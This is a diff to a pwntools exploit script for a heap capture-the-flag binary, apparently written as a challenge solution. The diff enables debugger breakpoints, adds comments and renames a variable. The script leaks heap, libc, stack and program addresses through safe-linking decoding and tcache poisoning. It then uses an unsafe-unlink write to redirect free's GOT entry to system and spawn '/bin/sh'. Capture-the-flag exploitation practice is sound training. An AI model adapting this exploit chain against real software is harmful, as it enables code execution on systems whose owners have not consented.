@@ -5,10 +5,10 @@ context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 
 p = gdb.debug('./one_write_patched', '''
-    # b *alloc_chunk
-    # b *free_chunk
-    # b *write_chunk
-    # b *read_chunk
+    b *alloc_chunk
+    b *free_chunk
+    b *write_chunk
+    b *read_chunk
     continue
 ''')
 
@@ -24,12 +24,16 @@ def free_chunk(idx):
     p.sendlineafter(b"idx: ", str(idx).encode())
 
 def write_chunk(data):
+    # there is only one write of size 0x5f8 max to global variable *the_chunk=heap_base_addr+0x2a0
     p.sendlineafter(b"> ", b'3')
     p.sendafter(b"data: ", data)
 
 def read_chunk():
+    # there is only one read of size 0x5f8 from global variable *the_chunk=heap_base_addr+0x2a0
     p.sendlineafter(b"> ", b'4')
     return p.recv(0x5f8)
+
+# in this challenge, read from and write to anywhere outside of heap area is unavailable
 
 glibc_e = ELF('./libc.so.6')
 
@@ -62,7 +66,7 @@ leaks2 = read_chunk()
 stack_argv_addr = u64(leaks2[0x60:0x68])^((heap_base_addr+0x300)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
 log.info(f"stack argv address: {hex(stack_argv_addr)}")
 
-# Stage 3: leak elf start address using tcache poisoning
+# Stage 3: leak elf base address using tcache poisoning
 # this leak technique is based on a free just after tcache poisoning and takes place in post tcache poisoning stage
 # it can typically copy a qword (in a "double-safe-linking-encrypted" form) in any specified address (16-byte aligned) into heap area
 alloc_chunk(7, 0x38)
@@ -77,8 +81,8 @@ alloc_chunk(11, 0x38)
 # tcache bins with size 0x40: heap_base_addr+0x3b0 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
 free_chunk(9)
 leaks3 = read_chunk()
-elf_start_addr = (u64(leaks3[0x110:0x118])^((heap_base_addr+0x3b0)>>12)^((stack_argv_addr-0x48)>>12))-0x10b0
-log.info(f"elf start address: {hex(elf_start_addr)}")
+elf_base_addr = (u64(leaks3[0x110:0x118])^((heap_base_addr+0x3b0)>>12)^((stack_argv_addr-0x48)>>12))-0x10b0
+log.info(f"elf base address: {hex(elf_base_addr)}")
 
 # Stage 4: unsafe unlink to arbitrary write to pop a shell
 # unsafe-unlink method is always used when there is a global variable in bss section storing a heap address
@@ -93,13 +97,13 @@ alloc_chunk(14, 0x48)
 # elf_base_addr+0x4080-0x18 (&the_chunk-0x18) is fd pointer of fake chunk, which satisfies the condition: fake chunk->fd->bk == fake chunk
 # elf_base_addr+0x4080-0x10 (&the_chunk-0x10) is bk pointer of fake chunk, which satisfies the condition: fake chunk->bk->fd == fake chunk
 # overwrite prev_size with 0x430 (fake chunk size) and size with 0x420 (set prev_inuse to 0) of chunk at heap_base_addr+0x6e0 to pass check of unsafe unlink
-write_chunk(p64(0)+p64(0x431)+p64(elf_start_addr+0x4080-0x18)+p64(elf_start_addr+0x4080-0x10)+b'\0'*0x410+p64(0x430)+p64(0x420))
+write_chunk(p64(0)+p64(0x431)+p64(elf_base_addr+0x4080-0x18)+p64(elf_base_addr+0x4080-0x10)+b'\0'*0x410+p64(0x430)+p64(0x420))
 # free chunk at heap_base_addr+0x6e0 to perform unsafe unlink
 free_chunk(13)
 # value in the_chunk is the_chunk-0x18 now
 # make value in the_chunk be address of free GOT table entry
 # make value in chunks[0] be address of "/bin/sh\x00" string
-write_chunk(p64(0)*3 + p64(elf_start_addr+0x4000)+p64(0)*3+p64(elf_start_addr+0x4080+0x28)+b'/bin/sh\x00')
+write_chunk(p64(0)*3 + p64(elf_base_addr+0x4000)+p64(0)*3+p64(elf_base_addr+0x4080+0x28)+b'/bin/sh\x00')
 # overwrite value in free GOT table entry to glibc system address
 write_chunk(p64(glibc_base_addr + glibc_e.sym.system))
 # free chunk at chunks[0] to trigger system("/bin/sh\x00") to pop a shell
